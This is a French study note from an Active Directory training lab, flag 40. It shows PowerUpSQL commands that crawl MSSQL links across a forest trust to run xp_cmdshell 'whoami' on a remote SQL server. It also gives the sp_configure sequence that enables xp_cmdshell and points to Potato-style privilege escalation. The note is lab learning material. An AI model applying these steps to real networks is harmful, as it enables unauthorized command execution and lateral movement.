---
flag: 40
machine: dcorp-mssql
statut: à faire
technique: MSSQL xp_cmdshell (cross-forest)
LO: "[[LO22 - MSSQL links]]"
---

# F40 · Privilèges OS sur eu-sql

> [!summary] Objectif
> Déterminer les privilèges au niveau OS sur `eu-sql` (identité sous laquelle `xp_cmdshell` s'exécute au bout de la chaine cross-forest).

## Contexte
- **Etape attack flow**: exec OS **cross-forest** via chaine de links — pivot depuis dollarcorp vers eurocorp sans TGT direct.
- **Ce qu on a**: privilèges SQL confirmés sur `eu-sql` (F39) suffisants pour activer/appeler `xp_cmdshell`.
- **Ce qu on cherche**: sortie de `whoami` (ou équivalent) exécuté sur l'OS de `eu-sql` — identité du service SQL sur cette machine.

## Solution

### Etape 1: Exec whoami via la chaine
```powershell
Import-Module C:\AD\Tools\PowerUpSQLmaster\PowerupSQL.psd1
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget eu-sql
```
→ Voir [[Cheatsheet - MSSQL et PowerUpSQL]].

### Etape 2 (optionnelle): Détailler les privilèges du token
```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami /priv'" -QueryTarget eu-sql
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami /groups'" -QueryTarget eu-sql
```
Utile pour repérer `SeImpersonatePrivilege` → escalade locale possible via Potato-family.

## Reponse

| Element | Valeur |
|---------|--------|
| Identité OS sur eu-sql | <A REMPLIR DEPUIS LAB> |
| Privilèges notables | <A REMPLIR DEPUIS LAB> |

## Pieges et OPSEC
- `xp_cmdshell` désactivé par défaut : peut nécessiter `sp_configure 'show advanced options',1; reconfigure; sp_configure 'xp_cmdshell',1; reconfigure;` — génère Event ID 15457 (config change) côté SQL.
- Souvent l'identité renvoyée est un compte de service (`NT SERVICE\MSSQLSERVER` ou compte AD dédié) — noter si `SeImpersonatePrivilege` présent (JuicyPotato/PrintSpoofer possible).
- Chaque `xp_cmdshell` génère Event ID 4688 côté OS si Process Creation activée + trace SQL audit.
- Pas de sortie ? Vérifier `sp_configure 'xp_cmdshell'` sur eu-sql — parfois OK sur maillon intermédiaire mais bloqué en fin de chaine.

## Refs
- [[Cheatsheet - MSSQL et PowerUpSQL]]
- [[Synthèse - MSSQL]]
- [[LO22 - MSSQL links]]
- [[Cheatsheet - Trusts et forêts]]
- [[Flags - Index]] · [[Journal - Index]]
